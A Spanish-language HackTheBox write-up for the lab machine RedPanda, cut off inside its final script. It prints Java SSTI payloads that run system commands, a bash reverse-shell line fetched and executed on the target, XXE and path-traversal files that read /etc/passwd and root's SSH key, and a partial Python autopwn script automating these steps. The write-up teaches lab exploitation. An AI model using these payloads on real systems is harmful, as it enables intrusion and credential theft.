---
title: "HTB: Resolución de RedPanda"
date: 2022-09-26 19:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [java ssti,xxe]     ## TAG names should always be lowercase
image: /photos/2022-09-26-RedPanda-WriteUp/htb.jpg
---


**RedPanda** es una máquina ***Linux*** en la que explotaremos un *Server Side Template Injection (**SSTI**)* para conseguir ejecutar comandos como el usuario *woodenk*. Posteriormente, para convertirnos en el usuario *root*, explotaremos un *XML External Entity (**XXE**)* gracias a un programa que está corriendo el mismo usuario *root* a intervalos regulares de tiempo. Conseguiremos su clave privada y nos podremos conectar por ssh. 

## Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
          <img src="/photos/2022-09-26-RedPanda-WriteUp/RedPanda.png" alt="drawing" width="465" />  
        </td>
        <td>
          <img src="/photos/2022-09-26-RedPanda-WriteUp/graph.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>


##  Reconocimiento  

### ping  

Primero enviaremos un *ping* a la máquina victima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.

<img src="/photos/2022-09-26-RedPanda-WriteUp/ping.png" alt="drawing"  />  

Vemos que nos enfrentamos a una máquina ***Linux*** ya que su ttl es 63.
 
### nmap  

Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 

<img src="/photos/2022-09-26-RedPanda-WriteUp/allports.png" alt="drawing"  />  

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no mas lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**--open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero **allPorts** en este caso.

Una vez descubiertos los **puertos abiertos**, que son el **22 y el 8080**, lanzaremos una serie de *scripts* básicos de enumeración contra estos, en busca de los servicios que están corriendo y de sus versiones. 

Ejecutaremos: ```nmap -sCV -p22,8080 10.10.11.170 -oN targeted```. Obtendremos el siguiente volcado:

```ruby 
## Nmap 7.92 scan initiated Mon Sep 26 13:56:23 2022 as: nmap -sCV -p22,8080 -oN targeted 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.087s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 26 Sep 2022 11:56:31 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span>
|     <span>
|     <span>
|     </div>
|     <div class='whiskers right'>
|     <span>
|     <span>
|     <span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 26 Sep 2022 11:56:31 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 26 Sep 2022 11:56:31 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=9/26%Time=6331936E%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2026\x20Sep\x20
SF:2022\x2011:56:31\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Mo
SF:n,\x2026\x20Sep\x202022\x2011:56:31\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Mon,\x2026\x20Sep\x202022\x2011:56:31\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
## Nmap done at Mon Sep 26 13:56:44 2022 -- 1 IP address (1 host up) scanned in 20.64 seconds

```
Podemos ver que en el puerto 22 está corriendo el servicio de *SSH* mientras que en el 8080 esta corriendo un servicio *HTTP*. De momento, como no disponemos de credenciales para autenticarnos contra *SSH*, nos centraremos en auditar el puerto 8080.


### Puerto 8080 abierto (HTTP)  

Empezaremos el reconocimiento del servidor *HTTP* lanzando la herramienta *whatweb*, que nos servirá para descubrir las tecnologías que corren detrás del servicio web.

<img src="/photos/2022-09-26-RedPanda-WriteUp/whatweb.png" alt="drawing"  />  

Vemos que como *framework* el servicio web está utilizando *Spring Boot*, un *framework* que corre en *Java*, muy popular y de código abierto.  
Para mas información: [Java Spring Boot](https://www.ibm.com/cloud/learn/java-spring-boot).

Si enviamos un *curl* a la web para ver las cabeceras de respuesta no encontramos nada interesante:

<img src="/photos/2022-09-26-RedPanda-WriteUp/curl.png" alt="drawing"  /> 

Cuando accedemos a la página web vemos lo siguiente:

<img src="/photos/2022-09-26-RedPanda-WriteUp/index.png" alt="drawing"  /> 

En la parte posterior podemos ver una barra de búsqueda. En este punto, podríamos estar pensando ya en realizar algún ataque de inyección como un *SQL injection*, *No SQL injection* o incluso un *SSTI*, ya que vemos reflejado en la página lo que nosotros introducimos en la barra de búsqueda (luego profundizaremos mas en este concepto). 

Pero antes de probar con cualquier de estos ataques voy a aplicar un poco mas de reconocimiento intentando descubrir directorios que se encuentren bajo el dominio de la máquina víctima.

####  Fuzzing de directorios  

Para el descubrimiento de directorios emplearé la herramienta *wfuzz*. El comando será el siguiente:
```wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.170:8080/FUZZ```

<img src="/photos/2022-09-26-RedPanda-WriteUp/wfuzz.png" alt="drawing"  /> 

**-c** es formato colorizado.  
**--hc=404** para esconder todas las repuestas 404 (No nos interesan ya que son directorios que no existen). *hc* viene de *hide code*.  
**-w** para especificar el diccionario que queremos utilizar. Para *fuzzear directorios yo casi siempre utilizo el mismo, directory-list-2.3-medium.txt*. Este diccionario se puede encontrar en el propio *Parrot OS o en Kali*. También se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-u** para especificar la *url*. La palabra *FUZZ* es un término de *wfuzz* y es donde se va a sustituir cada linea del diccionario. 

El único directorio interesante que encontramos es el directorio ***stats*** que nos devuelve un 200. El directorio *search* está relacionado con la barra de búsqueda y *error* nos devuelve un *500 server error*.

<img src="/photos/2022-09-26-RedPanda-WriteUp/woodenk.png" alt="drawing"  /> 

Como bien indica su nombre, el directorio stats nos muestra las estadísticas de la pagina web. Podemos ver que existen dos usuarios, *woodenk* y *damian*, los cuales han subido una serie de fotos y existe un recuento del numero de personas que han visto las fotos. La barra de búsqueda sirve para buscar estas imágenes. Por ejemplo, si escribimos *greg* obtenemos:

<img src="/photos/2022-09-26-RedPanda-WriteUp/greg.png" alt="drawing"  /> 

Aquí nos están dando una pista de por donde pueden ir los tiros para podernos adentrar en la máquina, a través de algún tipo de inyección. En este punto que ya sabemos como está organizada la web, vamos a intentar explotar la barra de búsqueda.

##  Consiguiendo shell como woodenk  

Lo primero que me doy cuenta al probar diferentes *payloads*, es que hay ciertos caracteres que están *banneados*, como por ejemplo el *$*. Esto nos puede dificultar un poco la explotación. 

Primero pruebo con las inyecciones *sql* y *nosql* mas simples pero no llego a ningún punto interesante. Simplemente me devuelven el output que yo escribo. Lo interesante ocurre cuando pruebo las inyecciones *SSTI (Server Side Template Injection)*. Como había comentado anteriormente, el hecho de ver en algún sitio de la web tu input te debe de hacer pensar en este tipo de vulnerabilidad.

### SSTI (Server Side Template Injection)  

En este ataque, un atacante se aprovecha de una platilla para inyectar un *payload* malicioso y poder así ejecutar comandos en el lado del servidor.  

Hay diferentes formas para ver si un campo es vulnerable a *SSTI*. Algunas son:

```
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

Si el SSTI se acontece, deberíamos de ver en algún sitio de la web el resultado de en este caso 7*7, que es 49.  

Si probamos con \#\{7\*7\} o con \*{7*7}, obtenemos resultados interesantes:

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstidetectionhashtag.png" alt="drawing"  /> 

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstidetectionasterisco.png" alt="drawing"  /> 
 
Ahora que ya sabemos que es vulnerable, vamos a probar con *payloads* mas sofisticados que nos puedan otorgar ejecución de comandos en la máquina víctima. Como sabemos que la web utiliza el *framework* de *Spring Boot* que corre en *Java*, vamos a probar a inyectar código diseñado para este lenguaje. En la página web [Hack Tricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) podemos ver algunos *payloads*.

Por ejemplo, si queremos obtener el archivo *passwd* de la máquina víctima, los *payloads* con los que podríamos jugar son:

```
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Es cierto que estos dos códigos utilizan el carácter *banneado* $ pero hemos visto que tanto con el símbolo * como con el ## obteníamos buenos resultados. Por lo tanto, sustituiremos el *$* por el *\**.  

El primer *payload* ejecuta el comando en la máquina víctima pero no muestra el output del mismo, mientras que con el segundo si que se ve.

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstiretrievepasswdnodump.png" alt="drawing"  /> 

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstiretrievepasswddump.png" alt="drawing"  /> 

Si me pongo en escucha con *tcpdump* por la interfaz tun0 para recibir un *ping* de la máquina víctima, vemos que lo recibo correctamente.

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstiping.png" alt="drawing"  /> 

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstipingreceived.png" alt="drawing"  /> 

### Explotando SSTI para conseguir una shell  


Es hora de enviarnos una *reverse shell*. Lo pasos que seguiré serán:  
Crear un archivo index.html con un código en bash que me enviará una reverse shell.

<img src="/photos/2022-09-26-RedPanda-WriteUp/indexhtml.png" alt="drawing"  /> 

Desplegaré con python un servicio http ```(sudo python3 -m http.server 80)``` que compartirá este archivo y me pondré en escucha por el puerto 443 ```(nc -nlvp 443)``` esperando a recibir la reverse shell.     

Del lado de la máquina victima, primero haré que se descargue mi fichero index.html y posteriormente que lo ejecute.  

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstiwget.png" alt="drawing"  /> 

<img src="/photos/2022-09-26-RedPanda-WriteUp/sstiexecrevshell.png " alt="drawing"  />

Recibimos la solicitud *HTTP* por arriba y la *shell* por abajo.

<img src="/photos/2022-09-26-RedPanda-WriteUp/revshell.png " alt="drawing"  /> 


Una vez recibida la shell, deberemos hacerle un tratamiento para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas... Los  comandos que ingresaremos serán:
```zsh
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos ajustar el número de filas y de columnas de esta *shell*. Con el comando ```stty size``` podemos consultar nuestras filas y columnas y con el comando ```stty rows <rows> cols <cols>``` podemos ajustar estos campos.

Finalmente. ya podremos visualizar la *user flag* que se encuentra en el *homedir* de *woodenk*:

<img src="/photos/2022-09-26-RedPanda-WriteUp/usertxt.png " alt="drawing"  />

Ahora deberemos escalar privilegios para convertirnos en el usuario ***root***.

##  Consiguiendo shell como root  

### Reconocimiento del sistema  

####  Grupos de woodenk 

Si hacemos un *id* podemos ver que el usuario *woodenk* se encuentra dentro del grupo *logs*. De momento esta información es poco relevante.

<img src="/photos/2022-09-26-RedPanda-WriteUp/logsgroup.png" alt="drawing"  />

####  Reconocimiento del sistema con pspy 

*Pspy* es una herramienta que nos permite ver que tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).  

El programa se puede transferir a la máquina victima desplegando un servidor en python ```(python3 -m http.server 80)``` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como /tmp o /dev/shm) hacer un wget para descargar el archivo.  

Vemos dos cosas interesantes que está ejecutando el usuario *root* (UID=0). Por un lado, esta ejecutando como el usuario *woodenk* el binario de java *panda_search-0.0.1-SNAPSHOT.jar*:

<img src="/photos/2022-09-26-RedPanda-WriteUp/pspyWoodenk.png" alt="drawing"  />

Por otra parte, está ejecutando como root el binario de java *final-1.0-jar-with-dependencies.jar*:

<img src="/photos/2022-09-26-RedPanda-WriteUp/pspyroot.png" alt="drawing"  />

De los dos binarios, el que mas me llama la atención es el segundo, ya que se esta ejecutando como el usuario al cual queremos escalar, root, y si tiene alguna falla el binario nos podemos aprovechar de esta para pivotar.  

Vamos a investigar un poco que el lo que está ejecutando root.

####  Análisis de un jar con la herramienta jd-gui 

Para analizar ejecutables de *java* recomiendo la herramienta *jd-gui*.

Nos trasladaremos el archivo *final-1.0-jar-with-dependencies.jar* que se encuentra en la ruta */opt/credit-score/LogParser/final/target* a nuestra máquina y lo abriremos con el programa mencionado anteriormente.

Cuando lo abramos, nos vamos a encontrar la siguiente estructura de directorios con un archivo interesante: *App.class*.

<img src="/photos/2022-09-26-RedPanda-WriteUp/jdguitree.png" alt="drawing"  />

El código que se encuentra en este archivo es el siguiente:


```java 
package com.logparser;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;

public class App {
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
  
  public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
  
  public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }
  
  public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
  }
  
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
}
```

Vamos a desglosar todo lo que pasa cuando se ejecuta este programa. Recordemos que lo ejecuta *root*:

* Primero el programa extrae el contenido de un fichero *redpanda.log* que se encuentra en la ruta */opt/panda_search*. Podemos tanto **leer** como **escribir** en este archivo ya que pertenecemos al grupo *logs*.

Cada búsqueda que hagas en la página web se registra en este archivo (tiene sentido llamándose el archivo *redpanda.log*). Tiene el siguiente aspecto: 

<img src="/photos/2022-09-26-RedPanda-WriteUp/redpandalog.png" alt="drawing"  />

* Por cada linea del archivo anterior mira que contenga la palabra *.jpg*. Si no se descarta la linea. En otras palabras, el programa está filtrando por imágenes. Por ejemplo, de la imagen anterior, la entrada que podemos ver la descartaria.
  
* Por cada linea que contenga la palabra *.jpg* guarda cada campo separado por \|\| en una variable. El primer campo será el *status_code*, el segundo campo la *ip*, el tercer campo el *user_agent* y el último el *uri*.

* Por cada imagen (el nombre de la imagen se encuentra en el *uri*), el programa busca en los metadatos de la misma un campo *Artist*. Basicamente lo que hace es saber quien es el creador de la foto.

* Por último, sabiendo quien es el creador de la imagen, se dirige al directorio /credits/, lee un archivo xml perteneciente a este *artista* que contiene un campo *Total views* y lo incrementa. 

En resumen, todo este entramado de funciones se dedica únicamente a contabilizar el número de visitas de las fotos que suben los artistas (wooden y damian) a la página web. Haciendo memoria, había un campo en la web donde podíamos ver este número.

####  Ejemplo  

<img src="/photos/2022-09-26-RedPanda-WriteUp/ejemplologs.png" alt="drawing"  />

De todas estas líneas las descartamos todas menos la que contiene */img/angy.jpg*.  
**status_code**: 200
**ip**: 10.10.14.12
**user_agent**: Mozilla...
**uri**: /img/angy.jpg  

Esta imagen contendrá en sus metadatos un campo ***Artist*** con el valor *damian* (la foto pertenece a esta persona).  

Una vez identificado su creador el programa se dirige a */credits/damian_creds.xml* e incrementa el número de visitas.


### Explotacion del binario: XXE  


La explotación consistira en crear una entrada maliciosa en el archivo *redpanda.log*, que contenga una foto con una campo *Artista* diseñado para que apunte a un archivo nuestro con extensión *_creds.xml*, que contendrá a su vez una entity (XXE) que ejecutara root, y así poder listar su clave ssh privada.

* Primero vamos con el contenido de la imagen.  

Nos descargaremos cualquier imagen de internet con extensión **jpg** (recordemos que el ejecutable filtraba por este tipo de imágenes) y con exiftool añadiremos el campo *Artist* con el siguiente contenido:

```exiftool -Artist="../../../tmp/pwned" gato.jpg```

El retroceso de directorios (../../../) se debe a que el programa busca este archivo con extension xml en el directorio */credits/*. Como no podemos escribir en este directorio deberemos ir hacia atrás para podernos situar en */tmp*, directorio en el cual si tenemos permisos de escritura.

<img src="/photos/2022-09-26-RedPanda-WriteUp/exiftooleditingphoto.png" alt="drawing"  />

Esto lo que hará es que cuando root ejecute el *jar* cogerá de nombre de artista de la imagen, *Artist=../../../pwned* y luego lo concatenará con *_creds.xml* para encontrar el fichero xml asociado al artista. Todo concatenado quedaría: 

```xmlPath=/credits/../../../tmp/pwned_creds.xml ```

Este archivo *pwned_creds.xml* lo habremos creado previamente nosotros, con el siguiente contenido:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../../tmp/gato.jpg</uri>
    <views>0</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>0</totalviews>
</credits>
```

El contenido del archivo se asemeja a los dos que podemos encontrar en el directorio */credits/*, pero hemos escrito una entidad externa, que, ejecutda por root, nos mostrará en este caso el */etc/passwd* de la máquina víctima. Para compararlo, el archivo original de *damian* es el siguiente:

```xml
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat /credits/damian_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```

El retroceso de directorios que vemos en el *uri* (como hemos visto en el ejemplo anterior, el *uri* coge la ruta de la imagen) tiene el mismo significado que anteriormente con el *pwned_creds.xml*. El ejecutable irá a buscar nuestra imagen maliciosa al directorio */opt/panda_search/src/main/resources/static/img*. Imaginemos ```/opt/panda_search/src/main/resources/static/gato.jpg```. Aquí no la va a encontrar, ya que nuestra foto estará en */tmp/* que es donde tenemos permisos de escritura. Por lo tanto deberemos hacer un *directory path traversal* para obtener el siguiente resultado:

```String fullpath = "/opt/panda_search/src/main/resources/static/../../../../../../../../tmp/gato.jpg;``` 

Por lo tando, despues de haber subido nuestra foto *gato.jpg* y *pwned_creds.xml * al directorio /tmp de la máquina víctima, quedará escribir una línea en el archivo redpanda.log con el siguiente aspecto:

```echo "200||10.10.14.12||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36||/../../../../../../../../tmp/gato.jpg" > /opt/panda_search/redpanda.log```

<img src="/photos/2022-09-26-RedPanda-WriteUp/redpandalogMaliciouspayload.png" alt="drawing"  />

Una vez root interprete el XML (tardará un rato), podremos visualizar el */etc/passwd* en nuestro archivo *pwned_creds.xml*:

<img src="/photos/2022-09-26-RedPanda-WriteUp/pwned_credsPasswd.png" alt="drawing"  />

### Shell  

Ahora, para obtener una shell como root, como el puerto 22 está abierto, nos interesa listar su clave privada para posteriormente autenticarnos por *SSH*. Para ello, en vez de *file:///etc/passwd* pondremos *file:///root/.ssh/id_rsa*. Obtendremos la siguiente clave:

<img src="/photos/2022-09-26-RedPanda-WriteUp/pwned_credsIdRSA.png" alt="drawing"  />

Ya finalmente, copiando esta clave en un archivo *id_rsa* y dándole permisos 600 (chmod 600 id_rsa) nos podremos conectar como *root* a la máquina víctima.

<img src="/photos/2022-09-26-RedPanda-WriteUp/rootShell.png" alt="drawing"  />

Y ya podremos visualizar la *flag de root*.

<img src="/photos/2022-09-26-RedPanda-WriteUp/rootflag.png" alt="drawing"  />


##  Autopwn script 

Como extra, he creado un *script* *Autopwn* que automatiza toda la intrusión y toda la escalada, depositando en un archivo id_rsa la clave ssh privada de root. Simplemente le tienes que especificar tu ip de la forma ```python3 autopwn.py 10.10.14.8```

```python
#!/usr/bin/python3 

from pwn import *
import os,socketserver,http.server,signal,sys,requests,pdb, threading

#Ctrl+C
def def_handler(sig, frame):
    print("[!] Salindo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales 
url="http://10.10.11.170:8080/search"
ip = ''

def runHTTPServer():
    PORT = 80
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    httpd.serve_forever()

def indexcreate():
    f = open("index.html", "w")
    f.write(f"bash -i >& /dev/tcp/{ip}/443 0>&1")
    f.close()


def makeRequest():
    post_data = {
        "name":"*{T(java.lang.Runtime).getRuntime().exec('wget 10.10.14.12 -O index.html')}"
    }

    r = requests.post(url, data=post_data) 

    post_data = {
        "name": "*{T(java.lang.Runtime).getRuntime().exec('bash index.html')}"
    }

    r = requests.post(url,data=post_data)

def createfiles():

    #Creating malicious photo
    os.system("wget https://static5.depositphotos.com/1007168/472/i/950/depositphotos_4725473-stock-photo-hot-summer-sun-wearing-shades.jpg -O foto.jpg")
    os.system("exiftool -Artist=\"../../../tmp/pwned\" foto.jpg")

    #Creating malicious xml file
    f = open("pwned_creds.xml","w")
    f.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
    f.write("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]>\n")
    f.write("<credits>\n")
    f.write("\t<author>damian</author>\n")
    f.write("\t<image>\n")
    f.write("\t\t<uri>/../../../../../../../../tmp/foto.jpg</uri>\n")
    f.write("\t\t<views>0</views>\n")
    f.write("\t\t<foo>&xxe;</foo>\n")
    f.write("\t</image>\n")
    f.write("\t<totalviews>0</totalviews>\n")
    f.write("</credits>")
    f.close()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\nIntroduce tu IP local")

    else:
        ip = sys.argv[1]
        p1 = log.progress("RedPanda autopwn to root user")
        p1.status("SSTI to woodenk user and XXE to root user")
        time.sleep(2)
        p1.status("Explotando SSTI")
        indexcreate()

        try:
            threading.Thread(target=runHTTPServer, args=()).start()
            try:
                threading.Thread(target=makeRequest, args=()).start()
